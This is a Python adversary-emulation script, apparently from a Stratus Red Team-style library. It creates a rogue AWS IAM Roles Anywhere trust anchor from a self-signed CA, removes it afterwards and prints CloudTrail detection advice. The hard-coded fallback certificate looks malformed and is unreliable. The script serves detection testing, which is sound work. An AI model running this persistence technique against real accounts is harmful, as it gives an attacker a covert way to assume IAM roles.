"""
Technique : aws.persistence.rolesanywhere-create-trust-anchor
Tactic    : Persistence (T1550.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/

Pre-requisites:
  - None. A self-signed CA certificate is generated on the fly.
  - pip install cryptography  (if not already present)

How the attack works:
  IAM Roles Anywhere allows workloads outside AWS to assume IAM roles using
  X.509 certificates signed by a trusted CA.  An attacker with
  rolesanywhere:CreateTrustAnchor can register their own CA certificate,
  enabling any entity with a matching signed certificate to assume IAM roles
  — without any long-term AWS credentials.

Detection signal:
  - rolesanywhere:CreateTrustAnchor — almost never called outside initial
    IAM Roles Anywhere onboarding; any unexpected occurrence is high-fidelity.
  - rolesanywhere:DisableTrustAnchor + DeleteTrustAnchor (cleanup).

Revert:
  - Automated: DisableTrustAnchor + DeleteTrustAnchor in the finally block.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError



# ── Constants ─────────────────────────────────────────────────────────────────

TRUST_ANCHOR_NAME = "stratus-red-team-trust-anchor"
DWELL_TIME_S      = 2

# Fallback self-signed cert PEM if cryptography library is unavailable.
# This is a pre-generated 2048-bit RSA self-signed CA cert (not a real CA).
FALLBACK_CERT_PEM = """\
-----BEGIN CERTIFICATE-----
MIICpDCCAYwCCQDU+pQ4pHpSpDANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjMwMTAxMDAwMDAwWhcNMjQwMTAxMDAwMDAwWjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7
o4qne60TB3wolAGkSMtMEFiLvWVF3V/hJNBbXJqrLT4vr3KHWiGMVKJo7WTEUqO
n0DXJW2Q+6lJp5Y1sDPaXIJW9KNqoZGTv0MTqXR2JCg3X9T3kE/cKEtNFKwHJV
b4W5hZwL6cuvKXFyFP1+MJvQd1U7JjhVp5q+Zl7m7s8QrX+jKWkrX8z0j8NvXE
Zd3g7pMfZ/7xT6RJZFaWxE6tT9JK8p0d6nT6Vs7aV+8e3c3jX8lZ0mDe3qTtUx
BflGp+cDK9D5/S3p2rjcG7x8TpV3Pk1lzT+8c2e9Kf3N9t1Yx0rYFqP3mRsBN0
GnD6tRqxAhBVzKkJVzxRAgMBAAEwDQYJKoZIhvcNAQELBQADggEBABa5rDm1mG/C
1a2lkqV6cH+cqUt2FNAn6bLmUQhYhzXhWjYeOL8c3X7sPd6RzIiR3kJqWlN9Xp
5TfD6u0pQeLpSOHvkCZfVR/xKaKqEpj3RJV0GrJkCp/WNjOKZJGXTcV4tXHLiY
4m7LQfTiZKqZbYQ5ULGPTzD1SrdKz4qPD6MXGv5h2TQ+JrJcYV0KEGXI3l0VLFQ
t7zVPi+a4HnZz5XClBhajHrXfJzFN/4lS8w8l1Q2a7jzjkW+lKEj2WGmSfJ+MfU
aDpvQl3fTEoq3YR9M+pFfPpP6t5Sn+iBjqrTi/HmFz5Vz5K1V2rYxUlJqW7kzY
3g7pV8tJnhQ=
-----END CERTIFICATE-----
"""


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def get_ca_cert_pem() -> str:
    """Return a self-signed CA certificate PEM.

    Tries to generate a fresh one via the ``cryptography`` library;
    falls back to a hard-coded PEM if the library is not installed.
    """
    try:
        import datetime as _dt
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "stratus-red-team-ca"),
        ])
        now = _dt.datetime.now(_dt.timezone.utc)
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + _dt.timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .add_extension(
                x509.KeyUsage(
                    digital_signature=False,
                    content_commitment=False,
                    key_encipherment=False,
                    data_encipherment=False,
                    key_agreement=False,
                    key_cert_sign=True,
                    crl_sign=True,
                    encipher_only=False,
                    decipher_only=False,
                ),
                critical=True,
            )
            .sign(key, hashes.SHA256())
        )
        return cert.public_bytes(serialization.Encoding.PEM).decode("utf-8")
    except ImportError:
        print("  [~] cryptography library not installed — using fallback cert PEM")
        print("      Install with: pip install cryptography")
        return FALLBACK_CERT_PEM


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    session    = boto3.Session()
    ra_client  = session.client("rolesanywhere")

    # ── Step 0: Prepare certificate ───────────────────────────────────────────
    banner("Step 0 — Prepare self-signed CA certificate")
    cert_pem = get_ca_cert_pem()
    print("  [+] CA certificate ready")

    trust_anchor_id = None

    try:
        # ── Step 1: Create trust anchor ───────────────────────────────────────
        banner("Step 1 — Create IAM Roles Anywhere trust anchor (CreateTrustAnchor)")
        response = ra_client.create_trust_anchor(
            name=TRUST_ANCHOR_NAME,
            source={
                "sourceData": {"x509CertificateData": cert_pem},
                "sourceType": "CERTIFICATE_BUNDLE",
            },
            enabled=True,
            tags=[
                {"key": "StratusRedTeam",  "value": "true"},
                {"key": "Purpose",         "value": "adversary-emulation"},
                {"key": "Technique",       "value": "aws.persistence.rolesanywhere-create-trust-anchor"},
            ],
        )
        trust_anchor_id = response["trustAnchor"]["trustAnchorId"]
        trust_anchor_arn = response["trustAnchor"]["trustAnchorArn"]

        print(f"  [+] Trust anchor created: {TRUST_ANCHOR_NAME}")
        print(f"  [+] Trust anchor ID  : {trust_anchor_id}")
        print(f"  [+] Trust anchor ARN : {trust_anchor_arn}")
        print("  [!] CloudTrail event: rolesanywhere:CreateTrustAnchor")
        print("  [!] Any workload holding a cert signed by this CA can now assume IAM roles.")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Disabling and deleting trust anchor")
        if trust_anchor_id:
            try:
                ra_client.disable_trust_anchor(trustAnchorId=trust_anchor_id)
                print(f"  [+] Trust anchor disabled")
            except ClientError as exc:
                print(f"  [!] DisableTrustAnchor failed: {exc}")

            try:
                ra_client.delete_trust_anchor(trustAnchorId=trust_anchor_id)
                print(f"  [+] Trust anchor deleted: {trust_anchor_id}")
            except ClientError as exc:
                print(f"  [!] DeleteTrustAnchor failed: {exc}")

    banner("Complete")
    print("CloudTrail events: rolesanywhere:CreateTrustAnchor, DisableTrustAnchor, DeleteTrustAnchor")
    print("\nDetection guidance:")
    print("  Alert on any rolesanywhere:CreateTrustAnchor call.")
    print("  Cross-reference with existing IAM Roles Anywhere configurations.")


if __name__ == "__main__":
    main()
